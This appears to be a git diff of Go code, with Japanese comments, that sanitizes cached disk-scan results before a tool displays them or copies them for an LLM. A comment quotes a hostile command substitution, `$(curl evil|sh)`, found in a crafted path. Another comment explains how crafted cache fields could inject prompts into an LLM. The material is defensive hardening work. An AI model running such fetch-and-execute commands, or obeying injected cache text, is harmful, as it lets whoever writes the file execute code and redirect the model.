@@ -20,7 +20,7 @@ import (
 // 起動時には**走査しない**。前回 doctor を開いたときの結果を読むだけ (起動を待たせない要件)。
 // だからトーストの数字は必ず過去のスキャン由来で、初回 (結果が無い) は沈黙する。
 //
-// ⚠️ 保存先は cachedir.Base() (= $XDG_CACHE_HOME/glog)。パスをここに書かない。
+// 🚨 保存先は cachedir.Base() (= $XDG_CACHE_HOME/glog)。パスをここに書かない。
 
 const (
 	// doctorToastThreshold は起動時トーストを出す解放可能量の下限 (issue 148 の既定 10GB)。
@@ -83,7 +83,7 @@ func doctorDiskCachePath() (string, error) {
 // 代わりに**前回のキャッシュのそのエントリを引き継ぐ**。前回の値は「最後に実測したときの値」で、
 // 再利用中の行が出しているのと同じ古さの情報なので、トーストの意味 (最後に実測した値) と合う。
 //
-// ⚠️ 「Reused が 1 件でもあれば結果ごと書かない」にしてはいけない。`doctorReuseFrom` の 1 時間は
+// 🚨 「Reused が 1 件でもあれば結果ごと書かない」にしてはいけない。`doctorReuseFrom` の 1 時間は
 // **各エントリが実測されるたびにリセットされる**ので、重いエントリが 2 件以上あって実測時刻が
 // 互い違いだと「常にどれか 1 件が再利用対象」の状態が持続し、キャッシュが恒久的に凍結する
 // (敵対レビュー 2026-09-03 で実測: 20 分おきに 6 時間・18 回開いても一度も更新されず、
@@ -96,7 +96,7 @@ func carryFresh(e doctorDiskCacheEntry, prevScannedAt, now time.Time) bool {
 		// 旧いキャッシュ (MeasuredAt を持たない版で書かれたもの) だけがここへ来る。
 		// 新しく書くエントリは doctorCacheFromReport が clampMeasuredAt で必ず埋めるので、
 		// **このフォールバックが継続的な判定に使われることは無い**。
-		// ⚠️ フォールバックを carryFresh の常用経路にしてはいけない: キャッシュ全体の
+		// 🚨 フォールバックを carryFresh の常用経路にしてはいけない: キャッシュ全体の
 		// ScannedAt は保存のたびに更新されるので、TTL より短い間隔で保存が続くと
 		// 「前回保存からの経過」しか見なくなり、**実測からの真の経過が永久に積まれない**
 		// (実測 2026-09-03: MeasuredAt を書かない変異で 10h おき 30 ラウンド = 真の経過 300h でも
@@ -106,7 +106,7 @@ func carryFresh(e doctorDiskCacheEntry, prevScannedAt, now time.Time) bool {
 	if at.IsZero() {
 		return false // 実測時刻が分からないものは引き継がない
 	}
-	// ⚠️ 未来の時刻は**引き継ぐ**。他の age 判定 (cooledDown / loadDoctorSnapshot /
+	// 🚨 未来の時刻は**引き継ぐ**。他の age 判定 (cooledDown / loadDoctorSnapshot /
 	// doctorReuseFrom) は「作業を省いてよいか / 黙ってよいか」を決めるので未来を疑う側 = 安全側だが、
 	// ここは「記録を残してよいか」なので**残す側が安全**。
 	// この判断が成立するのは **MeasuredAt が未来を指さないこと**を書き込み側 (clampMeasuredAt) が
@@ -264,7 +264,7 @@ func markDoctorNotified(now time.Time) {
 // snapshot と同じく**一般ユーザー権限で書き換えられる**のに、`loadDoctorDiskCache` は
 // JSON として読めて ScannedAt が非ゼロなら通していた (issue 193)。
 //
-// ⚠️ **読み込み側ではなくここで絞る**。`loadDoctorDiskCache` は cachedir とファイル I/O だけに
+// 🚨 **読み込み側ではなくここで絞る**。`loadDoctorDiskCache` は cachedir とファイル I/O だけに
 // 依存する関数で、カタログを知らない。読み込みにカタログを渡すと依存が増える一方、
 // カタログ照合が要るのは「人に見せる」瞬間だけなので、表示の入口に置く方が依存が少ない。
 //
@@ -317,7 +317,7 @@ func doctorStartupToast(c doctorDiskCache, ok bool, now time.Time) string {
 		text += fmt.Sprintf("、%d 件は診断できず", c.Failed)
 	}
 	text += " — D で doctor を開く"
-	// ⚠️ age < 0 (ScannedAt が未来) は「N 日前」を負の数で出さず、鮮度が不明である旨にする。
+	// 🚨 age < 0 (ScannedAt が未来) は「N 日前」を負の数で出さず、鮮度が不明である旨にする。
 	// 黙って注記を落とすと「新しい診断」に見える (issue 201)。
 	if age := now.Sub(c.ScannedAt); age < 0 {
 		text += " (診断時刻が未来。時計を確認してください)"
@@ -452,7 +452,7 @@ func loadDoctorSnapshotAny() (doctorSnapshot, bool) {
 // `Warning:` で始まる塊だけを残し、制御文字 (ANSI エスケープ・復帰) を落として長さと件数を切る。
 // これで「UI の行構造を偽装する」「画面を埋め尽くす」は防げる。
 //
-// ⚠️ 残った本文は依然としてキャッシュファイルの書き手が決められる文字列で、`Y` のコピー文にも乗る。
+// 🚨 残った本文は依然としてキャッシュファイルの書き手が決められる文字列で、`Y` のコピー文にも乗る。
 // brew 節にはコマンドの提示が無く (④ の削除対象でもない) ので、ここは形の検査に留めて
 // 「中身は信用していない」ことを記録する。中身まで断つなら復元をやめて毎回 brew doctor を回すことになり、
 // TTL 内の開き直しを速くするというこの機能の目的と衝突する。
@@ -512,7 +512,7 @@ func plausibleSize(n int64) bool { return n >= 0 }
 // 細工したパスは **prompt injection の材料**になり、人がそのまま貼れば任意コマンドの実行になる
 // (実測 2026-09-03: 埋め込み改行 + `$(curl evil|sh)` が y / Y の両方にそのまま出た。issue 193)。
 //
-// ⚠️ ここは**表示とコピーの健全性**の検査であって、削除の安全性ではない。④ の削除は
+// 🚨 ここは**表示とコピーの健全性**の検査であって、削除の安全性ではない。④ の削除は
 // 「必ず再スキャンして `validateTarget` を通す」が不変条件で、その規律は変わらない (issue 148)。
 func safeDisplayPath(p string) bool {
 	if p == "" || len(p) > maxRestoredPathLen {
@@ -599,7 +599,7 @@ func doctorSnapshotInCatalog(rs []disk.Result, has func(string) bool) []disk.Res
 // 残すものには **FromSnapshot=true** を立てる。snapshot 復元経路では Result 側に「走査していない」
 // 印が無く、それを示すのは view の snapshotAt だけ = Result 単位では区別できなかった。
 // ④ は「印が立っている行は削除の前に必ず再スキャンする」という不変条件にするので、Result 側に要る。
-// ⚠️ **Reused を流用してはいけない**。Reused は「重いエントリの計測値を前回から引き継いだ」という
+// 🚨 **Reused を流用してはいけない**。Reused は「重いエントリの計測値を前回から引き継いだ」という
 // 別の意味を既に持ち、行の「N 分前の計測を再利用」注記を出している。流用すると普通の開き直しで
 // 嘘の注記が全行に出る (敵対レビュー 2026-09-03 で実測: `-1113 分前の計測を再利用`)。
 func sanitizeSnapshotResults(rs []disk.Result, now time.Time) []disk.Result {
@@ -611,7 +611,7 @@ func sanitizeSnapshotResults(rs []disk.Result, now time.Time) []disk.Result {
 		// 崩れた Item は **その Item だけ落とし、合計を引き直す**。Result ごと落とすと
 		// パス 1 本の細工で 20GB のエントリが理由なく画面から消える (検査を足すほど消える範囲が
 		// 広がる)。Item 単位なら影響が局所に留まり、後から検査を足しやすい。
-		// ⚠️ 落としたら **Size を引き直す**。引かないと行の合計と Items の和が食い違い、
+		// 🚨 落としたら **Size を引き直す**。引かないと行の合計と Items の和が食い違い、
 		// 「消したのに減らない」に見える (合計は disk.SumDeletable が Result.Size を足す)
 		kept := make([]disk.Item, 0, len(r.Items))
 		dropped := 0
@@ -643,7 +643,7 @@ func sanitizeSnapshotResults(rs []disk.Result, now time.Time) []disk.Result {
 		// 自由文も絞る: diskCopyText は「別セッションの LLM に消してよいか聞く」形を作るので、
 		// 細工した Reason / Failures / Contents はそのまま prompt injection の材料になる
 		// (敵対レビュー 2026-09-03)。制御文字を落として長さと件数を切る
-		// ⚠️ **改行も落とす**。brew の警告は「(N 行)」の塊として畳んで出すので改行が正常だが、
+		// 🚨 **改行も落とす**。brew の警告は「(N 行)」の塊として畳んで出すので改行が正常だが、
 		// ディスク節の Reason / Failures / Contents は**1 件が 1 行**として描かれる。改行が残ると
 		// doctorRow.text の中に改行が入り、幅を数えるテスト (dispWidth) を素通りしたまま
 		// 固定高のパネルの行数が実際には増える (敵対レビュー 2026-09-03)。
